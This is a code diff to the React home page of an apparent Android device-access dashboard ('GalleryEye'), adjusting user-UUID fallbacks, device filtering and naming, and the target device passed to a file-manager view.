@@ -794,7 +794,7 @@ export default function Home(props: any) {
     }, [status, session?.user?.uuid, session?.user?.email]);
 
     useEffect(() => {
-        const effectiveUuid = session?.user?.uuid || (typeof window !== 'undefined' ? localStorage.getItem('galleryeye_user_uuid') : '');
+        const effectiveUuid = userUuid || session?.user?.uuid || (session?.user as any)?.id || (typeof window !== 'undefined' ? (localStorage.getItem('galleryeye_user_uuid') || localStorage.getItem('galleryeye_last_uuid')) : '');
         if (status === "authenticated" && effectiveUuid) {
             const uuid = effectiveUuid;
 
@@ -805,15 +805,17 @@ export default function Home(props: any) {
                     if (data && Array.isArray(data.devices)) {
                         const filteredList = data.devices.filter((d: any) => {
                             const devId = String(d.deviceId || d.id || d._id || '');
+                            if (d.online) return true;
                             return devId && !deletedDevicesRef.current.has(devId) && !deletedDevicesRef.current.has(String(d.deviceId)) && !deletedDevicesRef.current.has(String(d.id));
                         });
                         const enhancedList = filteredList.map((d: any) => {
                             const devId = String(d.deviceId || d.id || d._id || '');
+                            let name = d.customName || d.name || d.model || 'Android Device';
                             if (typeof window !== 'undefined') {
                                 const custom = localStorage.getItem(`dev_name_${devId}`);
-                                if (custom && custom.trim()) return { ...d, name: custom.trim() };
+                                if (custom && custom.trim()) name = custom.trim();
                             }
-                            return d;
+                            return { ...d, name };
                         });
                         setDevices(enhancedList);
                         try { localStorage.setItem('galleryeye_cached_devices', JSON.stringify(enhancedList)); } catch {}
@@ -896,18 +898,20 @@ export default function Home(props: any) {
             socket.on("device_list_update", (deviceList: any[]) => {
                 const filteredList = Array.isArray(deviceList) ? deviceList.filter(d => {
                     const devId = String(d.deviceId || d.id || d._id || '');
+                    if (d.online) return true;
                     return devId && !deletedDevicesRef.current.has(devId) && !deletedDevicesRef.current.has(String(d.deviceId)) && !deletedDevicesRef.current.has(String(d.id));
                 }) : [];
 
                 const enhancedList = filteredList.map(d => {
                     const devId = String(d.deviceId || d.id || d._id || '');
+                    let name = d.customName || d.name || d.model || 'Android Device';
                     if (typeof window !== 'undefined') {
                         const custom = localStorage.getItem(`dev_name_${devId}`);
                         if (custom && custom.trim()) {
-                            return { ...d, name: custom.trim() };
+                            name = custom.trim();
                         }
                     }
-                    return d;
+                    return { ...d, name };
                 });
                 setDevices(enhancedList);
                 try { localStorage.setItem('galleryeye_cached_devices', JSON.stringify(enhancedList)); } catch {}
@@ -1858,7 +1862,7 @@ export default function Home(props: any) {
                 delete (window as any).fetchCameraData;
             };
         }
-    }, [status, session?.user?.uuid]);
+    }, [status, session?.user?.uuid, userUuid]);
     const handleLoadMore = () => {
         if (galleryHasMore && !isLoadingMore && (window as any).fetchGalleryData) {
             (window as any).fetchGalleryData(galleryPage + 1, true, false, selectedDeviceId);
@@ -2601,12 +2605,13 @@ END:VCARD`;
                         </div>
                     );
                 }
-                const isOnline = !!devices.find(d => (d.deviceId || d.id || d._id) === selectedDeviceId)?.online;
+                const effectiveTargetDevice = selectedDeviceId || selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null) || (devices.length > 0 ? String(devices[0].deviceId || devices[0].id || devices[0]._id) : null);
+                const isOnline = !!devices.find(d => String(d.deviceId || d.id || d._id) === String(effectiveTargetDevice))?.online;
                 return (
                     <FileManagerView
                         socket={socket}
-                        userUuid={session?.user?.uuid}
-                        selectedDeviceId={selectedDeviceId}
+                        userUuid={userUuid}
+                        selectedDeviceId={effectiveTargetDevice}
                         isOnline={isOnline}
                     />
                 );
